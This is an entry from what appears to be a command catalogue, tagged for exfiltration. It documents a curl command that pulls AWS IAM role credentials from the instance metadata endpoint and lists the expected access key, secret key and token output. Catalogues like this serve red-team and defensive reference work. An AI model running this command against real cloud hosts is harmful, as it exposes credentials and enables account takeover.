---
data: >-
  curl
  http://169.254.169.254/latest/meta-data/iam/security-credentials/[redacted-role]
tags:
  - exfil
  - aws
  - credentials
type: command
output: 'JSON with AccessKeyId, SecretAccessKey, Token, etc.'
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.364Z'
id: b010aa4d-4ecf-49d8-b198-68ca4d06dd6c
verified: false
validated: true
submitted: true
---
# curl-aws-iam-credentials

## Command

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[redacted-role]
```

## Description

Fetches specific IAM role credentials from AWS metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Specific role endpoint | Yes |
| [redacted-role] | Role name from prior command | Yes |

## Examples

### Basic Usage

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[redacted-role]
```

## Expected Output

{"AccessKeyId":"...","SecretAccessKey":"...","Token":"..."}

## Related

- [[commands/curl-aws-iam-roles]]
